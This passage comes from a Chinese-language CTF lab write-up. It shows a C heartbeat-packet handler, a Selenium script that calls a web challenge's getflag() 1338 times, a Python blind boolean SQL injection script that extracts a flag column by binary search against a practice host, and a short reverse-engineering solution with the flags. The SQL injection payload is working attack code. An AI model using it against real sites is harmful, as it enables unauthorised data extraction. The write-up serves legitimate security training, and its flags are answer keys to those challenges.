<span class="normal"><a href="#__codelineno-13-16">16</a></span>
<span class="normal"><a href="#__codelineno-13-17">17</a></span>
<span class="normal"><a href="#__codelineno-13-18">18</a></span>
<span class="normal"><a href="#__codelineno-13-19">19</a></span>
<span class="normal"><a href="#__codelineno-13-20">20</a></span>
<span class="normal"><a href="#__codelineno-13-21">21</a></span>
<span class="normal"><a href="#__codelineno-13-22">22</a></span>
<span class="normal"><a href="#__codelineno-13-23">23</a></span>
<span class="normal"><a href="#__codelineno-13-24">24</a></span>
<span class="normal"><a href="#__codelineno-13-25">25</a></span>
<span class="normal"><a href="#__codelineno-13-26">26</a></span>
<span class="normal"><a href="#__codelineno-13-27">27</a></span>
<span class="normal"><a href="#__codelineno-13-28">28</a></span>
<span class="normal"><a href="#__codelineno-13-29">29</a></span>
<span class="normal"><a href="#__codelineno-13-30">30</a></span>
<span class="normal"><a href="#__codelineno-13-31">31</a></span>
<span class="normal"><a href="#__codelineno-13-32">32</a></span>
<span class="normal"><a href="#__codelineno-13-33">33</a></span>
<span class="normal"><a href="#__codelineno-13-34">34</a></span>
<span class="normal"><a href="#__codelineno-13-35">35</a></span>
<span class="normal"><a href="#__codelineno-13-36">36</a></span>
<span class="normal"><a href="#__codelineno-13-37">37</a></span>
<span class="normal"><a href="#__codelineno-13-38">38</a></span>
<span class="normal"><a href="#__codelineno-13-39">39</a></span>
<span class="normal"><a href="#__codelineno-13-40">40</a></span>
<span class="normal"><a href="#__codelineno-13-41">41</a></span>
<span class="normal"><a href="#__codelineno-13-42">42</a></span>
<span class="normal"><a href="#__codelineno-13-43">43</a></span>
<span class="normal"><a href="#__codelineno-13-44">44</a></span>
<span class="normal"><a href="#__codelineno-13-45">45</a></span>
<span class="normal"><a href="#__codelineno-13-46">46</a></span>
<span class="normal"><a href="#__codelineno-13-47">47</a></span>
<span class="normal"><a href="#__codelineno-13-48">48</a></span>
<span class="normal"><a href="#__codelineno-13-49">49</a></span>
<span class="normal"><a href="#__codelineno-13-50">50</a></span>
<span class="normal"><a href="#__codelineno-13-51">51</a></span>
<span class="normal"><a href="#__codelineno-13-52">52</a></span>
<span class="normal"><a href="#__codelineno-13-53">53</a></span>
<span class="normal"><a href="#__codelineno-13-54">54</a></span>
<span class="normal"><a href="#__codelineno-13-55">55</a></span>
<span class="normal"><a href="#__codelineno-13-56">56</a></span>
<span class="normal"><a href="#__codelineno-13-57">57</a></span>
<span class="normal"><a href="#__codelineno-13-58">58</a></span>
<span class="normal"><a href="#__codelineno-13-59">59</a></span>
<span class="normal"><a href="#__codelineno-13-60">60</a></span>
<span class="normal"><a href="#__codelineno-13-61">61</a></span>
<span class="normal"><a href="#__codelineno-13-62">62</a></span>
<span class="normal"><a href="#__codelineno-13-63">63</a></span>
<span class="normal"><a href="#__codelineno-13-64">64</a></span>
<span class="normal"><a href="#__codelineno-13-65">65</a></span>
<span class="normal"><a href="#__codelineno-13-66">66</a></span>
<span class="normal"><a href="#__codelineno-13-67">67</a></span>
<span class="normal"><a href="#__codelineno-13-68">68</a></span>
<span class="normal"><a href="#__codelineno-13-69">69</a></span>
<span class="normal"><a href="#__codelineno-13-70">70</a></span>
<span class="normal"><a href="#__codelineno-13-71">71</a></span>
<span class="normal"><a href="#__codelineno-13-72">72</a></span>
<span class="normal"><a href="#__codelineno-13-73">73</a></span>
<span class="normal"><a href="#__codelineno-13-74">74</a></span>
<span class="normal"><a href="#__codelineno-13-75">75</a></span>
<span class="normal"><a href="#__codelineno-13-76">76</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span>
<a id="__codelineno-13-2" name="__codelineno-13-2"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span>
<a id="__codelineno-13-3" name="__codelineno-13-3"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;string.h&gt;</span>
<a id="__codelineno-13-4" name="__codelineno-13-4"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdint.h&gt;</span>
<a id="__codelineno-13-5" name="__codelineno-13-5"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdbool.h&gt;</span>
<a id="__codelineno-13-6" name="__codelineno-13-6"></a>
<a id="__codelineno-13-7" name="__codelineno-13-7"></a><span class="cp">#define MAX_PKT_SIZE 0x1000</span>
<a id="__codelineno-13-8" name="__codelineno-13-8"></a>
<a id="__codelineno-13-9" name="__codelineno-13-9"></a><span class="k">struct</span><span class="w"> </span><span class="nc">hbpkt</span>
<a id="__codelineno-13-10" name="__codelineno-13-10"></a><span class="p">{</span>
<a id="__codelineno-13-11" name="__codelineno-13-11"></a><span class="w">    </span><span class="kt">uint32_t</span><span class="w"> </span><span class="n">size</span><span class="p">;</span>
<a id="__codelineno-13-12" name="__codelineno-13-12"></a><span class="w">    </span><span class="kt">uint32_t</span><span class="w"> </span><span class="n">timestamp</span><span class="p">;</span>
<a id="__codelineno-13-13" name="__codelineno-13-13"></a><span class="w">    </span><span class="kt">uint32_t</span><span class="w"> </span><span class="n">index</span><span class="p">;</span>
<a id="__codelineno-13-14" name="__codelineno-13-14"></a><span class="w">    </span><span class="kt">uint32_t</span><span class="w"> </span><span class="n">cred</span><span class="p">;</span>
<a id="__codelineno-13-15" name="__codelineno-13-15"></a><span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">data</span><span class="p">[];</span>
<a id="__codelineno-13-16" name="__codelineno-13-16"></a><span class="p">};</span>
<a id="__codelineno-13-17" name="__codelineno-13-17"></a>
<a id="__codelineno-13-18" name="__codelineno-13-18"></a><span class="k">struct</span><span class="w"> </span><span class="nc">hbpkt</span><span class="w"> </span><span class="o">*</span><span class="n">get_heart_beat</span><span class="p">()</span>
<a id="__codelineno-13-19" name="__codelineno-13-19"></a><span class="p">{</span>
<a id="__codelineno-13-20" name="__codelineno-13-20"></a><span class="w">    </span><span class="kt">uint8_t</span><span class="w"> </span><span class="n">buffer</span><span class="p">[</span><span class="n">MAX_PKT_SIZE</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="mi">0</span><span class="p">};</span>
<a id="__codelineno-13-21" name="__codelineno-13-21"></a>
<a id="__codelineno-13-22" name="__codelineno-13-22"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">fread</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span><span class="w"> </span><span class="nc">hbpkt</span><span class="p">),</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="n">stdin</span><span class="p">)</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mi">1</span><span class="p">)</span>
<a id="__codelineno-13-23" name="__codelineno-13-23"></a><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span>
<a id="__codelineno-13-24" name="__codelineno-13-24"></a>
<a id="__codelineno-13-25" name="__codelineno-13-25"></a><span class="w">    </span><span class="k">struct</span><span class="w"> </span><span class="nc">hbpkt</span><span class="w"> </span><span class="o">*</span><span class="n">tmp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="k">struct</span><span class="w"> </span><span class="nc">hbpkt</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">buffer</span><span class="p">;</span>
<a id="__codelineno-13-26" name="__codelineno-13-26"></a>
<a id="__codelineno-13-27" name="__codelineno-13-27"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">tmp</span><span class="o">-&gt;</span><span class="n">size</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span><span class="w"> </span><span class="nc">hbpkt</span><span class="p">)</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">tmp</span><span class="o">-&gt;</span><span class="n">size</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">MAX_PKT_SIZE</span><span class="p">)</span>
<a id="__codelineno-13-28" name="__codelineno-13-28"></a><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span>
<a id="__codelineno-13-29" name="__codelineno-13-29"></a>
<a id="__codelineno-13-30" name="__codelineno-13-30"></a><span class="w">    </span><span class="kt">size_t</span><span class="w"> </span><span class="n">data_len</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">tmp</span><span class="o">-&gt;</span><span class="n">size</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span><span class="w"> </span><span class="nc">hbpkt</span><span class="p">);</span>
<a id="__codelineno-13-31" name="__codelineno-13-31"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">fread</span><span class="p">(</span><span class="n">tmp</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="n">data_len</span><span class="p">,</span><span class="w"> </span><span class="n">stdin</span><span class="p">)</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">data_len</span><span class="p">)</span>
<a id="__codelineno-13-32" name="__codelineno-13-32"></a><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span>
<a id="__codelineno-13-33" name="__codelineno-13-33"></a>
<a id="__codelineno-13-34" name="__codelineno-13-34"></a><span class="w">    </span><span class="k">struct</span><span class="w"> </span><span class="nc">hbpkt</span><span class="w"> </span><span class="o">*</span><span class="n">res</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">malloc</span><span class="p">(</span><span class="n">tmp</span><span class="o">-&gt;</span><span class="n">size</span><span class="p">);</span>
<a id="__codelineno-13-35" name="__codelineno-13-35"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">res</span><span class="p">)</span>
<a id="__codelineno-13-36" name="__codelineno-13-36"></a><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span>
<a id="__codelineno-13-37" name="__codelineno-13-37"></a>
<a id="__codelineno-13-38" name="__codelineno-13-38"></a><span class="w">    </span><span class="n">memcpy</span><span class="p">(</span><span class="n">res</span><span class="p">,</span><span class="w"> </span><span class="n">buffer</span><span class="p">,</span><span class="w"> </span><span class="n">tmp</span><span class="o">-&gt;</span><span class="n">size</span><span class="p">);</span>
<a id="__codelineno-13-39" name="__codelineno-13-39"></a>
<a id="__codelineno-13-40" name="__codelineno-13-40"></a><span class="w">    </span><span class="n">res</span><span class="o">-&gt;</span><span class="n">index</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
<a id="__codelineno-13-41" name="__codelineno-13-41"></a>
<a id="__codelineno-13-42" name="__codelineno-13-42"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">res</span><span class="p">;</span>
<a id="__codelineno-13-43" name="__codelineno-13-43"></a><span class="p">}</span>
<a id="__codelineno-13-44" name="__codelineno-13-44"></a>
<a id="__codelineno-13-45" name="__codelineno-13-45"></a><span class="kt">int</span><span class="w"> </span><span class="n">reply_heart_beat</span><span class="p">(</span><span class="k">struct</span><span class="w"> </span><span class="nc">hbpkt</span><span class="w"> </span><span class="o">*</span><span class="n">pkt</span><span class="p">)</span>
<a id="__codelineno-13-46" name="__codelineno-13-46"></a><span class="p">{</span>
<a id="__codelineno-13-47" name="__codelineno-13-47"></a><span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">err</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="c1">// 这里给定初始化</span>
<a id="__codelineno-13-48" name="__codelineno-13-48"></a><span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">written</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
<a id="__codelineno-13-49" name="__codelineno-13-49"></a>
<a id="__codelineno-13-50" name="__codelineno-13-50"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">pkt</span><span class="o">-&gt;</span><span class="n">size</span><span class="p">)</span>
<a id="__codelineno-13-51" name="__codelineno-13-51"></a><span class="w">    </span><span class="p">{</span>
<a id="__codelineno-13-52" name="__codelineno-13-52"></a><span class="w">        </span><span class="n">written</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">fwrite</span><span class="p">(</span><span class="n">pkt</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="n">pkt</span><span class="o">-&gt;</span><span class="n">size</span><span class="p">,</span><span class="w"> </span><span class="n">stdout</span><span class="p">);</span>
<a id="__codelineno-13-53" name="__codelineno-13-53"></a><span class="w">        </span><span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
<a id="__codelineno-13-54" name="__codelineno-13-54"></a><span class="w">    </span><span class="p">}</span>
<a id="__codelineno-13-55" name="__codelineno-13-55"></a>
<a id="__codelineno-13-56" name="__codelineno-13-56"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">written</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="p">(</span><span class="kt">uint32_t</span><span class="p">)</span><span class="n">written</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">pkt</span><span class="o">-&gt;</span><span class="n">size</span><span class="p">)</span>
<a id="__codelineno-13-57" name="__codelineno-13-57"></a><span class="w">    </span><span class="p">{</span>
<a id="__codelineno-13-58" name="__codelineno-13-58"></a><span class="w">        </span><span class="n">err</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">-1</span><span class="p">;</span>
<a id="__codelineno-13-59" name="__codelineno-13-59"></a><span class="w">    </span><span class="p">}</span>
<a id="__codelineno-13-60" name="__codelineno-13-60"></a>
<a id="__codelineno-13-61" name="__codelineno-13-61"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">err</span><span class="p">;</span>
<a id="__codelineno-13-62" name="__codelineno-13-62"></a><span class="p">}</span>
<a id="__codelineno-13-63" name="__codelineno-13-63"></a>
<a id="__codelineno-13-64" name="__codelineno-13-64"></a><span class="kt">int</span><span class="w"> </span><span class="n">main</span><span class="p">()</span><span class="w"> </span><span class="c1">// 无修改</span>
<a id="__codelineno-13-65" name="__codelineno-13-65"></a><span class="p">{</span>
<a id="__codelineno-13-66" name="__codelineno-13-66"></a><span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">err</span><span class="p">;</span>
<a id="__codelineno-13-67" name="__codelineno-13-67"></a><span class="w">    </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="nb">true</span><span class="p">)</span>
<a id="__codelineno-13-68" name="__codelineno-13-68"></a><span class="w">    </span><span class="p">{</span>
<a id="__codelineno-13-69" name="__codelineno-13-69"></a><span class="w">        </span><span class="k">struct</span><span class="w"> </span><span class="nc">hbpkt</span><span class="w"> </span><span class="o">*</span><span class="n">p</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">get_heart_beat</span><span class="p">();</span>
<a id="__codelineno-13-70" name="__codelineno-13-70"></a><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">p</span><span class="p">)</span>
<a id="__codelineno-13-71" name="__codelineno-13-71"></a><span class="w">            </span><span class="k">continue</span><span class="p">;</span>
<a id="__codelineno-13-72" name="__codelineno-13-72"></a>
<a id="__codelineno-13-73" name="__codelineno-13-73"></a><span class="w">        </span><span class="n">err</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">reply_heart_beat</span><span class="p">(</span><span class="n">p</span><span class="p">);</span>
<a id="__codelineno-13-74" name="__codelineno-13-74"></a><span class="w">        </span><span class="n">free</span><span class="p">(</span><span class="n">p</span><span class="p">);</span>
<a id="__codelineno-13-75" name="__codelineno-13-75"></a><span class="w">    </span><span class="p">}</span>
<a id="__codelineno-13-76" name="__codelineno-13-76"></a><span class="p">}</span>
</code></pre></div></td></tr></table></div>
<div style="page-break-after: always;"></div>

<h2 id="web">Web<a class="headerlink" href="#web" title="Permanent link">&para;</a></h2>
<h4 id="challenge-1_3">Challenge 1<a class="headerlink" href="#challenge-1_3" title="Permanent link">&para;</a></h4>
<p>flag: <code>flag{56297ad00e70449a16700a77bf24b071}</code></p>
<p>使用开发者工具（因为快捷键被禁了所以要在工具栏里手动打开），检查发现按钮onfocus有hidden属性，其onclick执行函数getflag()。尝试在控制台执行这个函数，alert提示1/1337，然后再执行提示token错误。再尝试刷新重新执行getflag()，发现alert提示2/1337，说明实际操作是执行getflag()、刷新、再getflag()。重复1337次（应该）能拿到flag。所以使用python的selenium库进行模拟操作执行。这里需要GoogleDriver，操作方法就不赘述了。</p>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-14-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-14-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-14-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-14-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-14-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-14-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-14-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-14-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-14-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-14-10">10</a></span>
<span class="normal"><a href="#__codelineno-14-11">11</a></span>
<span class="normal"><a href="#__codelineno-14-12">12</a></span>
<span class="normal"><a href="#__codelineno-14-13">13</a></span>
<span class="normal"><a href="#__codelineno-14-14">14</a></span>
<span class="normal"><a href="#__codelineno-14-15">15</a></span>
<span class="normal"><a href="#__codelineno-14-16">16</a></span>
<span class="normal"><a href="#__codelineno-14-17">17</a></span>
<span class="normal"><a href="#__codelineno-14-18">18</a></span>
<span class="normal"><a href="#__codelineno-14-19">19</a></span>
<span class="normal"><a href="#__codelineno-14-20">20</a></span>
<span class="normal"><a href="#__codelineno-14-21">21</a></span>
<span class="normal"><a href="#__codelineno-14-22">22</a></span>
<span class="normal"><a href="#__codelineno-14-23">23</a></span>
<span class="normal"><a href="#__codelineno-14-24">24</a></span>
<span class="normal"><a href="#__codelineno-14-25">25</a></span>
<span class="normal"><a href="#__codelineno-14-26">26</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1"></a><span class="kn">from</span> <span class="nn">selenium</span> <span class="kn">import</span> <span class="n">webdriver</span>
<a id="__codelineno-14-2" name="__codelineno-14-2"></a><span class="kn">from</span> <span class="nn">selenium.webdriver.chrome.service</span> <span class="kn">import</span> <span class="n">Service</span>
<a id="__codelineno-14-3" name="__codelineno-14-3"></a><span class="kn">from</span> <span class="nn">selenium.webdriver.common.by</span> <span class="kn">import</span> <span class="n">By</span>
<a id="__codelineno-14-4" name="__codelineno-14-4"></a><span class="kn">from</span> <span class="nn">selenium.webdriver.chrome.options</span> <span class="kn">import</span> <span class="n">Options</span>
<a id="__codelineno-14-5" name="__codelineno-14-5"></a><span class="kn">from</span> <span class="nn">selenium.common.exceptions</span> <span class="kn">import</span> <span class="n">NoAlertPresentException</span>
<a id="__codelineno-14-6" name="__codelineno-14-6"></a><span class="kn">import</span> <span class="nn">time</span>
<a id="__codelineno-14-7" name="__codelineno-14-7"></a><span class="n">chrome_options</span> <span class="o">=</span> <span class="n">Options</span><span class="p">()</span>
<a id="__codelineno-14-8" name="__codelineno-14-8"></a><span class="n">chrome_options</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s2">&quot;--disable-infobars&quot;</span><span class="p">)</span>
<a id="__codelineno-14-9" name="__codelineno-14-9"></a><span class="n">chrome_options</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s2">&quot;--disable-notifications&quot;</span><span class="p">)</span>
<a id="__codelineno-14-10" name="__codelineno-14-10"></a><span class="n">chrome_options</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s2">&quot;--start-maximized&quot;</span><span class="p">)</span>
<a id="__codelineno-14-11" name="__codelineno-14-11"></a><span class="n">service</span> <span class="o">=</span> <span class="n">Service</span><span class="p">()</span>
<a id="__codelineno-14-12" name="__codelineno-14-12"></a><span class="n">driver</span> <span class="o">=</span> <span class="n">webdriver</span><span class="o">.</span><span class="n">Chrome</span><span class="p">(</span><span class="n">service</span><span class="o">=</span><span class="n">service</span><span class="p">,</span> <span class="n">options</span><span class="o">=</span><span class="n">chrome_options</span><span class="p">)</span>
<a id="__codelineno-14-13" name="__codelineno-14-13"></a><span class="n">url</span> <span class="o">=</span> <span class="s2">&quot;http://pumpk1n.com/lab0.php&quot;</span>
<a id="__codelineno-14-14" name="__codelineno-14-14"></a><span class="k">try</span><span class="p">:</span>
<a id="__codelineno-14-15" name="__codelineno-14-15"></a>    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1338</span><span class="p">):</span>
<a id="__codelineno-14-16" name="__codelineno-14-16"></a>        <span class="n">driver</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
<a id="__codelineno-14-17" name="__codelineno-14-17"></a>        <span class="n">driver</span><span class="o">.</span><span class="n">execute_script</span><span class="p">(</span><span class="s2">&quot;getflag()&quot;</span><span class="p">)</span>
<a id="__codelineno-14-18" name="__codelineno-14-18"></a>        <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.2</span><span class="p">)</span>
<a id="__codelineno-14-19" name="__codelineno-14-19"></a>        <span class="k">try</span><span class="p">:</span>
<a id="__codelineno-14-20" name="__codelineno-14-20"></a>            <span class="n">alert</span> <span class="o">=</span> <span class="n">driver</span><span class="o">.</span><span class="n">switch_to</span><span class="o">.</span><span class="n">alert</span>
<a id="__codelineno-14-21" name="__codelineno-14-21"></a>            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">alert</span><span class="o">.</span><span class="n">text</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
<a id="__codelineno-14-22" name="__codelineno-14-22"></a>            <span class="n">alert</span><span class="o">.</span><span class="n">accept</span><span class="p">()</span>
<a id="__codelineno-14-23" name="__codelineno-14-23"></a>        <span class="k">except</span> <span class="n">NoAlertPresentException</span><span class="p">:</span>
<a id="__codelineno-14-24" name="__codelineno-14-24"></a>            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;No alert&quot;</span><span class="p">)</span>
<a id="__codelineno-14-25" name="__codelineno-14-25"></a><span class="k">finally</span><span class="p">:</span>
<a id="__codelineno-14-26" name="__codelineno-14-26"></a>    <span class="k">pass</span>
</code></pre></div></td></tr></table></div>
<p>执行到最后console就会提示flag了。</p>
<h4 id="challenge-2_3">Challenge 2<a class="headerlink" href="#challenge-2_3" title="Permanent link">&para;</a></h4>
<p>flag: flag{45541872-d892-4d7f-a2b1-da68f7597b1f}</p>
<p>首先测试发现输入1和2会返回两句不同的话，输入3以上就爆了，又说在table=flag和column=flag的地方，所以尝试注入select flag from flag，但是会被检测注入，尝试用/**/代替空格也不奏效，然后发现用2|1这样的语句会返回结果，所以考虑用if语句和纯函数注入，方法是检测输入的值和表值的ascii是不是相等，相等就输出1，不然就输出2，这样输出1就代表正确，输出2就代表不正确。为了减少遍历次数，使用二分搜索。</p>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-15-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-15-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-15-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-15-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-15-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-15-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-15-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-15-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-15-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-15-10">10</a></span>
<span class="normal"><a href="#__codelineno-15-11">11</a></span>
<span class="normal"><a href="#__codelineno-15-12">12</a></span>
<span class="normal"><a href="#__codelineno-15-13">13</a></span>
<span class="normal"><a href="#__codelineno-15-14">14</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-15-1" name="__codelineno-15-1"></a><span class="kn">from</span> <span class="nn">requests</span> <span class="kn">import</span> <span class="n">post</span>
<a id="__codelineno-15-2" name="__codelineno-15-2"></a><span class="n">result</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
<a id="__codelineno-15-3" name="__codelineno-15-3"></a><span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">50</span><span class="p">):</span>
<a id="__codelineno-15-4" name="__codelineno-15-4"></a>    <span class="n">low</span><span class="p">,</span> <span class="n">high</span> <span class="o">=</span> <span class="mi">32</span><span class="p">,</span> <span class="mi">127</span>
<a id="__codelineno-15-5" name="__codelineno-15-5"></a>    <span class="k">while</span> <span class="n">low</span> <span class="o">&lt;</span> <span class="n">high</span><span class="p">:</span>
<a id="__codelineno-15-6" name="__codelineno-15-6"></a>        <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">low</span> <span class="o">+</span> <span class="n">high</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span>
<a id="__codelineno-15-7" name="__codelineno-15-7"></a>        <span class="n">response</span> <span class="o">=</span> <span class="n">post</span><span class="p">(</span><span class="s1">&#39;http://2c0616c9-8209-4027-aa6a-724ee8f9d39e.node5.buuoj.cn:81/index.php&#39;</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s2">&quot;id&quot;</span><span class="p">:</span> <span class="sa">f</span><span class="s2">&quot;if(ascii(substr((select(flag)from(flag)),</span><span class="si">{</span><span class="n">x</span><span class="si">}</span><span class="s2">,1))&gt;</span><span class="si">{</span><span class="n">mid</span><span class="si">}</span><span class="s2">,1,2)&quot;</span><span class="p">})</span><span class="o">.</span><span class="n">text</span>
<a id="__codelineno-15-8" name="__codelineno-15-8"></a>        <span class="k">if</span> <span class="s1">&#39;glzjin&#39;</span> <span class="ow">in</span> <span class="n">response</span><span class="p">:</span>
<a id="__codelineno-15-9" name="__codelineno-15-9"></a>            <span class="n">low</span> <span class="o">=</span> <span class="n">mid</span> <span class="o">+</span> <span class="mi">1</span>
<a id="__codelineno-15-10" name="__codelineno-15-10"></a>        <span class="k">else</span><span class="p">:</span>
<a id="__codelineno-15-11" name="__codelineno-15-11"></a>            <span class="n">high</span> <span class="o">=</span> <span class="n">mid</span>
<a id="__codelineno-15-12" name="__codelineno-15-12"></a>    <span class="n">result</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">low</span><span class="p">)</span>
<a id="__codelineno-15-13" name="__codelineno-15-13"></a>    <span class="nb">print</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
<a id="__codelineno-15-14" name="__codelineno-15-14"></a><span class="nb">print</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
</code></pre></div></td></tr></table></div>
<div style="page-break-after: always;"></div>

<h2 id="reverse">Reverse<a class="headerlink" href="#reverse" title="Permanent link">&para;</a></h2>
<p>这个rev好简单，要是今年校赛题都是这样的就更好了（x）</p>
<p><img alt="alt text" src="../reverseyitizuobuchulai.png" /></p>
<p>下载crackme并丢到IDA中可以找到如下内容：</p>
<p><img alt="alt text" src="../1726afb752ded5231e1c369bafb25f80.png" /></p>
<p>顺藤摸到verify和table：</p>
<p><img alt="alt text" src="../06206ec8ee738a2e981dcfb9071eedf8.png" /></p>
<p>很容易发现是对buffer按位乘16再和table比较。所以只需要把table全除16就可以得到结果：</p>
<p><img alt="alt text" src="../image-1.png" /></p>
<p>于是得到flag：<code>AAA{HiReversq}</code></p>
<p><center></p>
<p>&gt;&gt;3240102120&lt;&lt;</p>
<p></center></p>












                
              </article>
            </div>
          
          
<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
        </div>
        
          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
  Back to top
</button>
        
      </main>
      
        <footer class="md-footer">
  
    
      
      <nav class="md-footer__inner md-grid" aria-label="Footer" >
        
          
          <a href="../../others/test/" class="md-footer__link md-footer__link--prev" aria-label="Previous: test">
            <div class="md-footer__button md-icon">
              
              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
            </div>
            <div class="md-footer__title">
              <span class="md-footer__direction">
                Previous
              </span>
              <div class="md-ellipsis">
                test
              </div>
            </div>
          </a>
        
        
          
          <a href="../misc_lab1/" class="md-footer__link md-footer__link--next" aria-label="Next: misc_lab1">
